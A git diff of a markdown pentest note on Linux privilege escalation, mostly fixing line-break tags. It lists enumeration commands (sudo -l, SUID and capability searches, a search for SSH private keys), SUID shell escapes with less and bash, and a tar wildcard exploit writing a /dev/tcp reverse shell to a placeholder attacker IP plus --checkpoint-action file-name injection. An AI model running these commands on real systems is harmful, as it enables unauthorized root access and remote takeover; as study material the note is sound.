@@ -2,6 +2,8 @@
 title: 5 – Privesc Linux
 summary: Privilege Escalation step – a note for elevating privileges on a Linux machine.
 description: Privilege Escalation step – a note for elevating privileges on a Linux machine.
+tags:
+  - privesc-linux
 ---
 
 # Privesc Checklist
@@ -9,35 +11,35 @@ description: Privilege Escalation step – a note for elevating privileges on a 
 ---
 
  > 
- > **<font color=red>sudo -l</font>**</br>
+ > **<font color=red>sudo -l</font>**<br>
  > Display commands allowed to run with root privileges.
 
  > 
- > **<font color=red>history</font>**</br>
+ > **<font color=red>history</font>**<br>
  > Show shell history.
 
  > 
- > **<font color=red>env</font>**</br>
+ > **<font color=red>env</font>**<br>
  > Show environment variables.
 
  > 
- > **<font color=red>find / -perm -u=s -type f 2> /dev/null</font>**</br>
+ > **<font color=red>find / -perm -u=s -type f 2> /dev/null</font>**<br>
  > Search for commands with SUID enabled (then check [https://gtfobins.github.io/](https://gtfobins.github.io/)) 
 
  > 
- > **<font color=red>getcap -r / 2>/dev/null</font>**</br>
+ > **<font color=red>getcap -r / 2>/dev/null</font>**<br>
  > Search for commands with capabilities (then check [https://gtfobins.github.io/](https://gtfobins.github.io/)) 
 
  > 
- > **<font color=red>find / -writable 2>/dev/null</font>**</br>
+ > **<font color=red>find / -writable 2>/dev/null</font>**<br>
  > Search for writable folders.
 
  > 
- > **<font color=red>find / -name id_rsa 2> /dev/null/</font>**</br>
+ > **<font color=red>find / -name id_rsa 2> /dev/null/</font>**<br>
  > Search for SSH private keys.
 
  > 
- > **<font color=red>cat /etc/crontab</font>**</br>
+ > **<font color=red>cat /etc/crontab</font>**<br>
  > Looking for automated scripts.
 
 # Others Suggestions
@@ -67,7 +69,7 @@ https://github.com/carlospolop/PEASS-ng/releases
 https://github.com/liamg/traitor
 
  > 
- > **<font color=red>traitor</font>**</br>
+ > **<font color=red>traitor</font>**<br>
 
 ---
 
@@ -83,7 +85,7 @@ https://github.com/rebootuser/LinEnum
 ### LYNSIS
 
  > 
- > **lynis audit system --pentest**</br>
+ > **lynis audit system --pentest**<br>
 
 ---
 
@@ -91,7 +93,7 @@ https://github.com/rebootuser/LinEnum
 
 
  > 
- > **<font color=red>use</font> <font color=lightblue>post/multi/recon/local_exploit_suggester</font>**</br>
+ > **<font color=red>use</font> <font color=lightblue>post/multi/recon/local_exploit_suggester</font>**<br>
  > Check exploits for privilege escalation.
 
 # SUID Examples
@@ -107,8 +109,8 @@ https://github.com/rebootuser/LinEnum
 ### CP
 
  > 
- > **<font color=red>cp /root/</font> /home/myUser/**</br>
- > **<font color=red>cd</font> /home/myUser/root**</br>
+ > **<font color=red>cp /root/</font> /home/myUser/**<br>
+ > **<font color=red>cd</font> /home/myUser/root**<br>
  > Access root content.
 
 ---
@@ -116,8 +118,8 @@ https://github.com/rebootuser/LinEnum
 ### LESS
 
  > 
- > **<font color=red>less</font> /etc/hosts**</br>
- > **<font color=red>!/bin/sh</font>**</br>
+ > **<font color=red>less</font> /etc/hosts**<br>
+ > **<font color=red>!/bin/sh</font>**<br>
  > Get a root shell.
 
 ---
@@ -125,7 +127,7 @@ https://github.com/rebootuser/LinEnum
 ### BASH
 
  > 
- > **<font color=red>bash -p</font>**</br>
+ > **<font color=red>bash -p</font>**<br>
  > Get a root shell.
 
 # Wildcard Exploitation
@@ -146,6 +148,6 @@ Script running as root:
 Exploit:
 
  > 
- > **<font color=red>echo "bash -i >& i/dev/tcp/</font>\[ATTACKER IP\]<font color=red>/</font>\[ATTACKER PORT\] <font color=red>0>&1" > </font>revshell.sh**</br>
- > **<font color=red>touch "</font>/home/myUser/backups/<font color=red>--checkpoint-action=exec=</font>sh revshell.sh<font color=red>"</font>**</br>
- > **<font color=red>touch "</font>/home/myUser/<font color=red>"--checkpoint=1"</font>**</br>
+ > **<font color=red>echo "bash -i >& i/dev/tcp/</font>\[ATTACKER IP\]<font color=red>/</font>\[ATTACKER PORT\] <font color=red>0>&1" > </font>revshell.sh**<br>
+ > **<font color=red>touch "</font>/home/myUser/backups/<font color=red>--checkpoint-action=exec=</font>sh revshell.sh<font color=red>"</font>**<br>
+ > **<font color=red>touch "</font>/home/myUser/<font color=red>"--checkpoint=1"</font>**<br>
